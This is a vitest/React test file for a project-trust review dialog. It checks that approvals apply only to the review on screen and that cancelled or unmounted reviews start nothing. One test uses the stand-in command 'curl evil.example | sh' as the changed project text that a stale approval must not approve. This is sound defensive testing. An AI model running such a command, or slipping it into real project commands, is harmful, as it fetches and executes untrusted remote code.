import { act, cleanup, fireEvent, render, screen, waitFor, within } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";

import { ProjectTrustDialog } from "../components/ProjectTrustDialog";
import {
  APPROVAL_IN_FLIGHT_NOTE,
  APPROVE_AND_START,
  approveShownReview,
  CLEAR_FALSE,
  CLEAR_TRUE,
  NO_REVIEW_OPEN,
  REVIEW_CHANGED,
  shownReviewToken,
  START_FALSE,
  START_TRUE,
  TRUST_TEXT_CHANGED_CODE,
  useProjectTrustReview,
  type ProjectTrust,
  type ProjectTrustRuntime,
  type ProjectTrustTarget,
  type ProjectTrustView,
} from "./projectTrust";

/**
 * PRD #1885 review — the review flow's own guarantees, through the hook and
 * the dialog together: what an approval is bound to (the review on screen,
 * identified by its number and digest), when a start may still happen (only
 * while the review it was asked for is on screen), which config revision the
 * start gets, and what the dialog shows of each role's flags.
 */

type Review = Extract<ProjectTrust, { kind: "review" }>;

const TARGET_A: ProjectTrustTarget = { deckId: "deck-a", path: "/work/a", orchestration: "team" };
const TARGET_B: ProjectTrustTarget = { deckId: "deck-a", path: "/work/b", orchestration: "team" };

function reviewOf(target: ProjectTrustTarget, digest: string, extra: Partial<Review> = {}): Review {
  return {
    kind: "review",
    project: target.path,
    orchestration: target.orchestration,
    state: "never_approved",
    roles: [{ name: "orchestrator", command: `run ${target.path}`, start: true, clear: true }],
    removedRoles: [],
    digest,
    ...extra,
  };
}

/** A promise the test settles. */
function deferred<T>() {
  let resolve: (value: T) => void = () => {};
  let reject: (cause: unknown) => void = () => {};
  const promise = new Promise<T>((ok, fail) => { resolve = ok; reject = fail; });
  return { promise, resolve, reject };
}

/** The hook and its dialog, with buttons that open a review of A or B the way a screen's launch does. */
function Harness({ runtime, starts }: { runtime: ProjectTrustRuntime; starts: { target: ProjectTrustTarget; approved: ProjectTrustView }[] }) {
  const trust = useProjectTrustReview(runtime);
  const open = (target: ProjectTrustTarget) => {
    void trust.check(target, (approved) => { starts.push({ target, approved }); }, { deckName: "build-box" });
  };
  return <>
    {/* voice-registry-exempt: a test harness's stand-ins for a screen's launch */}
    <button type="button" onClick={() => open(TARGET_A)}>open A</button>
    {/* voice-registry-exempt: a test harness's stand-ins for a screen's launch */}
    <button type="button" onClick={() => open(TARGET_B)}>open B</button>
    {trust.shown && <ProjectTrustDialog review={trust.shown} onApprove={(token) => { void trust.approve(token); }} onCancel={trust.cancel} />}
  </>;
}

function runtimeWith(states: Map<string, Review>, approve: ProjectTrustRuntime["approveProjectTrust"]) {
  return {
    projectTrustState: vi.fn(async (target: ProjectTrustTarget): Promise<ProjectTrust> => structuredClone(states.get(target.path)!)),
    approveProjectTrust: vi.fn(approve),
  };
}

const dialog = () => screen.findByTestId("project-trust-dialog");

afterEach(() => {
  cleanup();
  expect(approveShownReview(shownReviewToken())).toBe(NO_REVIEW_OPEN);
});

describe("useProjectTrustReview (PRD #1885 review)", () => {
  /**
   * Auditor 3. Scenario: "approve project commands" is spoken while review A
   * is shown, and the voice answer is delayed; meanwhile A is cancelled and
   * review B opens. When the answer arrives with the token declared against
   * A, B is not approved and nothing starts, and the refusal says the review
   * changed.
   */
  it("does not let a voice approval declared against one review approve another", async () => {
    const states = new Map([[TARGET_A.path, reviewOf(TARGET_A, "aa")], [TARGET_B.path, reviewOf(TARGET_B, "bb")]]);
    const runtime = runtimeWith(states, async (target) => ({ ...states.get(target.path)!, state: "approved" }));
    const starts: { target: ProjectTrustTarget; approved: ProjectTrustView }[] = [];
    render(<Harness runtime={runtime} starts={starts} />);

    fireEvent.click(screen.getByText("open A"));
    await dialog();
    const declared = shownReviewToken();
    expect(declared).toBeDefined();

    fireEvent.click(within(await dialog()).getByRole("button", { name: "Cancel" }));
    fireEvent.click(screen.getByText("open B"));
    await waitFor(() => expect(screen.getByTestId("project-trust-project")).toHaveTextContent("/work/b"));

    let answer: string | undefined;
    act(() => { answer = approveShownReview(declared); });
    expect(answer).toBe(REVIEW_CHANGED);
    /* An utterance declared with no review open approves nothing either. */
    act(() => { answer = approveShownReview(undefined); });
    expect(answer).toBe(REVIEW_CHANGED);
    await act(async () => { await Promise.resolve(); });
    expect(runtime.approveProjectTrust).not.toHaveBeenCalled();
    expect(starts).toEqual([]);

    /* The token read while B is shown does approve B. */
    act(() => { answer = approveShownReview(shownReviewToken()); });
    expect(answer).toBeUndefined();
    await waitFor(() => expect(starts.map((start) => start.target)).toEqual([TARGET_B]));
    expect(runtime.approveProjectTrust).toHaveBeenCalledWith(TARGET_B, "bb");
  });

  /**
   * Auditor 3, second half. Scenario: an approval is refused because the text
   * changed, and the review is re-shown with the new text. A voice approval
   * declared against the text first shown approves nothing.
   */
  it("does not let a voice approval declared against the old text approve the re-shown text", async () => {
    const states = new Map([[TARGET_A.path, reviewOf(TARGET_A, "aa")]]);
    const runtime = runtimeWith(states, async () => { throw new Error(`${TRUST_TEXT_CHANGED_CODE}: changed`); });
    const starts: { target: ProjectTrustTarget; approved: ProjectTrustView }[] = [];
    render(<Harness runtime={runtime} starts={starts} />);

    fireEvent.click(screen.getByText("open A"));
    const shown = await dialog();
    const declared = shownReviewToken();
    states.set(TARGET_A.path, reviewOf(TARGET_A, "a2", { roles: [{ name: "orchestrator", command: "curl evil.example | sh", start: true, clear: true }] }));
    fireEvent.click(within(shown).getByRole("button", { name: APPROVE_AND_START }));
    await waitFor(() => expect(screen.getByTestId("project-trust-command")).toHaveTextContent("curl evil.example | sh"));
    runtime.approveProjectTrust.mockClear();

    let answer: string | undefined;
    act(() => { answer = approveShownReview(declared); });
    expect(answer).toBe(REVIEW_CHANGED);
    await act(async () => { await Promise.resolve(); });
    expect(runtime.approveProjectTrust).not.toHaveBeenCalled();
    expect(starts).toEqual([]);
    fireEvent.click(within(await dialog()).getByRole("button", { name: "Cancel" }));
  });

  /**
   * Reviewer 2. Scenario: Approve and start is pressed against a slow deck;
   * while the approval is on its way the dialog says Cancel will start
   * nothing, and the user cancels. When the deck's answer arrives, nothing
   * starts.
   */
  it("starts nothing when the review is cancelled while its approval is in flight", async () => {
    const states = new Map([[TARGET_A.path, reviewOf(TARGET_A, "aa")]]);
    const pending = deferred<ProjectTrust>();
    const runtime = runtimeWith(states, () => pending.promise);
    const starts: { target: ProjectTrustTarget; approved: ProjectTrustView }[] = [];
    render(<Harness runtime={runtime} starts={starts} />);

    fireEvent.click(screen.getByText("open A"));
    fireEvent.click(within(await dialog()).getByRole("button", { name: APPROVE_AND_START }));
    await waitFor(() => expect(runtime.approveProjectTrust).toHaveBeenCalledTimes(1));
    expect(screen.getByTestId("project-trust-in-flight")).toHaveTextContent(APPROVAL_IN_FLIGHT_NOTE);

    fireEvent.keyDown(await dialog(), { key: "Escape" });
    await waitFor(() => expect(screen.queryByTestId("project-trust-dialog")).toBeNull());
    await act(async () => { pending.resolve({ ...states.get(TARGET_A.path)!, state: "approved" }); await Promise.resolve(); });

    expect(starts).toEqual([]);
  });

  /**
   * Reviewer 2. Scenario: the screen hosting the review closes (unmounts)
   * while the approval is in flight. When the deck's answer arrives, nothing
   * starts.
   */
  it("starts nothing when the screen unmounts while its approval is in flight", async () => {
    const states = new Map([[TARGET_A.path, reviewOf(TARGET_A, "aa")]]);
    const pending = deferred<ProjectTrust>();
    const runtime = runtimeWith(states, () => pending.promise);
    const starts: { target: ProjectTrustTarget; approved: ProjectTrustView }[] = [];
    const { unmount } = render(<Harness runtime={runtime} starts={starts} />);

    fireEvent.click(screen.getByText("open A"));
    fireEvent.click(within(await dialog()).getByRole("button", { name: APPROVE_AND_START }));
    await waitFor(() => expect(runtime.approveProjectTrust).toHaveBeenCalledTimes(1));
    unmount();
    await act(async () => { pending.resolve({ ...states.get(TARGET_A.path)!, state: "approved" }); await Promise.resolve(); });

    expect(starts).toEqual([]);
  });

  /**
   * Reviewer 4. Scenario: the deck answers the approval with the config
   * revision it read. The start is handed that view, so the launch can use
   * the revision of the text the user approved.
   */
  it("hands the start the deck's view of what it approved, with its config revision", async () => {
    const states = new Map([[TARGET_A.path, reviewOf(TARGET_A, "aa", { configRevision: "rev-shown" })]]);
    const runtime = runtimeWith(states, async () => ({ ...states.get(TARGET_A.path)!, state: "approved", configRevision: "rev-approved" }));
    const starts: { target: ProjectTrustTarget; approved: ProjectTrustView }[] = [];
    render(<Harness runtime={runtime} starts={starts} />);

    fireEvent.click(screen.getByText("open A"));
    fireEvent.click(within(await dialog()).getByRole("button", { name: APPROVE_AND_START }));

    await waitFor(() => expect(starts).toHaveLength(1));
    expect(starts[0].approved.configRevision).toBe("rev-approved");
  });

  /**
   * Reviewer 3, desktop half, and auditor 4's "show which deck". Scenario: a
   * changed orchestration whose only change is a worker's `clear` flag. The
   * dialog names the deck and shows both flags of every role, in the TUI's
   * words, so the change the user approves is visible.
   */
  it("shows the deck and each role's start and clear flags", async () => {
    const changed = reviewOf(TARGET_A, "aa", {
      state: "changed",
      roles: [
        { name: "orchestrator", command: "cat", start: true, clear: true },
        { name: "coder", change: "changed", command: "cat", start: false, clear: false },
      ],
    });
    const runtime = runtimeWith(new Map([[TARGET_A.path, changed]]), async () => ({ ...changed, state: "approved" }));
    render(<Harness runtime={runtime} starts={[]} />);

    fireEvent.click(screen.getByText("open A"));
    const shown = await dialog();
    expect(within(shown).getByTestId("project-trust-deck")).toHaveTextContent("build-box");
    const roles = within(shown).getAllByTestId("project-trust-role");
    expect(within(roles[0]).getByTestId("project-trust-start")).toHaveTextContent(START_TRUE);
    expect(within(roles[0]).getByTestId("project-trust-clear")).toHaveTextContent(CLEAR_TRUE);
    expect(within(roles[1]).getByTestId("project-trust-start")).toHaveTextContent(START_FALSE);
    expect(within(roles[1]).getByTestId("project-trust-clear")).toHaveTextContent(CLEAR_FALSE);
    expect(within(roles[1]).getByTestId("project-trust-role-change")).toHaveTextContent("changed");
    fireEvent.click(within(shown).getByRole("button", { name: "Cancel" }));
  });
});
